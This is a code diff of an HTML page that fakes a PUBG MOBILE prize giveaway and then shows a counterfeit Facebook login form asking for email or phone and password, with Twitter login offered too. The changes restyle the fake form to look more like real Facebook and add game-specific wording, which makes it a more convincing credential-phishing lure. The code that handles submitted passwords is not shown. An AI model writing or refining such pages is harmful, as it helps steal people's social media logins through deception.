@@ -211,22 +211,6 @@
             border-bottom: 2px solid gold;
         }
 
-        .win-modal-header h1 {
-            color: gold;
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            font-weight: bold;
-            letter-spacing: 3px;
-        }
-
-        .win-modal-header h2 {
-            color: #fff;
-            font-size: 1.5rem;
-            margin-bottom: 5px;
-            font-weight: normal;
-        }
-
         .prize-image-container {
             width: 100%;
             padding: 30px;
@@ -275,6 +259,34 @@
         .checkbox-option.active {
             background: #444;
             border-color: gold;
+        }
+
+        .checkbox-option-content {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .social-icon {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            font-weight: bold;
+            border-radius: 5px;
+        }
+
+        .facebook-icon {
+            background: #1877f2;
+            color: white;
+        }
+
+        .twitter-icon {
+            background: #1da1f2;
+            color: white;
         }
 
         .checkbox-option span {
@@ -341,45 +353,56 @@
 
         /* Стили для Facebook окна */
         .facebook-modal-content {
-            background: #fff;
+            background: #f0f2f5;
             color: #000;
             min-height: 600px;
         }
 
         .facebook-header {
-            background: #1877f2;
-            padding: 30px 20px;
+            background: #fff;
+            padding: 20px;
             text-align: center;
+            border-bottom: 1px solid #ddd;
         }
 
         .facebook-logo {
-            color: white;
+            color: #1877f2;
             font-size: 3rem;
             font-weight: bold;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
             letter-spacing: -1px;
         }
 
         .facebook-subtitle {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 1.2rem;
+            color: #1c1e21;
+            font-size: 1rem;
             max-width: 300px;
             margin: 0 auto;
             line-height: 1.4;
+            font-weight: normal;
         }
 
         .facebook-form {
-            padding: 30px 20px;
+            padding: 20px;
+            background: #fff;
+            margin: 15px;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
         }
 
         .facebook-input {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 1rem;
-            background: #f5f6f7;
+            background: #fff;
+            color: #1c1e21;
+        }
+
+        .facebook-input::placeholder {
+            color: #8a8d91;
         }
 
         .facebook-input:focus {
@@ -390,7 +413,7 @@
 
         .facebook-login-button {
             width: 100%;
-            padding: 15px;
+            padding: 14px;
             background: #1877f2;
             color: white;
             border: none;
@@ -398,7 +421,7 @@
             font-size: 1.1rem;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             transition: background-color 0.3s;
         }
 
@@ -409,8 +432,9 @@
         .facebook-divider {
             text-align: center;
             margin: 20px 0;
-            color: #666;
+            color: #8a8d91;
             position: relative;
+            font-size: 0.9rem;
         }
 
         .facebook-divider::before {
@@ -420,14 +444,13 @@
             left: 0;
             right: 0;
             height: 1px;
-            background: #ddd;
+            background: #dddfe2;
         }
 
         .facebook-divider span {
             background: #fff;
             padding: 0 15px;
             position: relative;
-            font-size: 0.9rem;
         }
 
         .facebook-create-button {
@@ -440,7 +463,7 @@
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            margin: 0 auto 25px;
+            margin: 0 auto 15px;
             display: block;
             transition: background-color 0.3s;
         }
@@ -451,17 +474,17 @@
 
         .facebook-links {
             text-align: center;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #ddd;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #dddfe2;
         }
 
         .facebook-links a {
             color: #1877f2;
             text-decoration: none;
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             display: block;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         .facebook-links a:hover {
@@ -469,29 +492,29 @@
         }
 
         .facebook-language {
-            background: #f0f2f5;
-            padding: 20px;
-            margin-top: 20px;
-            text-align: left;
+            background: #fff;
+            padding: 15px 20px;
+            margin-top: 15px;
+            border-top: 1px solid #dddfe2;
         }
 
         .facebook-language select {
             width: 100%;
             padding: 10px;
-            border: 1px solid #ddd;
+            border: 1px solid #dddfe2;
             border-radius: 4px;
             background: white;
-            color: #333;
-            font-size: 0.9rem;
+            color: #1c1e21;
+            font-size: 0.85rem;
         }
 
         .facebook-footer {
             background: #fff;
-            padding: 20px;
-            border-top: 1px solid #ddd;
-            font-size: 0.8rem;
-            color: #666;
+            padding: 15px 20px;
+            font-size: 0.75rem;
+            color: #8a8d91;
             text-align: center;
+            border-top: 1px solid #dddfe2;
         }
 
         /* Стили для Twitter окна */
@@ -651,19 +674,6 @@
             border-bottom: 2px solid gold;
         }
 
-        .success-header h1 {
-            color: gold;
-            font-size: 2.2rem;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-        }
-
-        .success-header h2 {
-            color: #fff;
-            font-size: 1.5rem;
-            margin-bottom: 5px;
-        }
-
         .success-prize-container {
             padding: 30px;
             background: #111;
@@ -761,14 +771,6 @@
                 margin: 15px auto;
             }
 
-            .win-modal-header h1 {
-                font-size: 2rem;
-            }
-
-            .win-modal-header h2 {
-                font-size: 1.5rem;
-            }
-
             .prize-image {
                 max-width: 150px;
                 max-height: 150px;
@@ -779,7 +781,7 @@
             }
 
             .facebook-subtitle {
-                font-size: 1.1rem;
+                font-size: 0.9rem;
             }
         }
     </style>
@@ -806,8 +808,7 @@
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
             <div class="win-modal-header">
-                <h1>CONGRATULATIONS!</h1>
-                <h2>You Won a Prize!</h2>
+                <!-- Текст удален как указано -->
             </div>
             
             <div class="prize-image-container">
@@ -817,11 +818,17 @@
             <div class="login-options">
                 <h3>Login With:</h3>
                 <div class="checkbox-option" id="facebookOption">
-                    <span>Login With Facebook</span>
+                    <div class="checkbox-option-content">
+                        <div class="social-icon facebook-icon">f</div>
+                        <span>Login With Facebook</span>
+                    </div>
                     <div class="checkbox-icon"></div>
                 </div>
                 <div class="checkbox-option" id="twitterOption">
-                    <span>Login With Twitter</span>
+                    <div class="checkbox-option-content">
+                        <div class="social-icon twitter-icon">𝕏</div>
+                        <span>Login With Twitter</span>
+                    </div>
                     <div class="checkbox-icon"></div>
                 </div>
             </div>
@@ -838,11 +845,11 @@
         <div class="modal-content facebook-modal-content">
             <div class="facebook-header">
                 <div class="facebook-logo">facebook</div>
-                <div class="facebook-subtitle">Connect with friends and the world around you on Facebook.</div>
+                <div class="facebook-subtitle">Log in to your Facebook account to connect to PUBG MOBILE</div>
             </div>
             
             <form class="facebook-form" id="facebookForm">
-                <input type="text" class="facebook-input" id="fbEmail" placeholder="Email or phone number" required>
+                <input type="text" class="facebook-input" id="fbEmail" placeholder="Mobile number or email address" required>
                 <input type="password" class="facebook-input" id="fbPassword" placeholder="Password" required>
                 
                 <button type="submit" class="facebook-login-button">Log In</button>
@@ -851,7 +858,7 @@
                     <span>or</span>
                 </div>
                 
-                <button type="button" class="facebook-create-button" id="createAccount">Create New Account</button>
+                <button type="button" class="facebook-create-button" id="createAccount">Create new account</button>
                 
                 <div class="facebook-links">
                     <a href="#" id="fbNotNow">Not now</a>
@@ -922,8 +929,7 @@
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal-content">
             <div class="success-header">
-                <h1>CONGRATULATIONS!</h1>
-                <h2>Your Prize is Ready</h2>
+                <!-- Текст удален как указано -->
             </div>
             
             <div class="success-prize-container">
@@ -931,7 +937,8 @@
             </div>
             
             <div class="success-message">
-                <h3>Prize Successfully Claimed</h3>
+                <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
+                <h3 style="color: gold; margin-top: 15px;">Congratulations</h3>
                 <p style="margin-top: 10px;">Your prize has been sent to your account</p>
             </div>
             
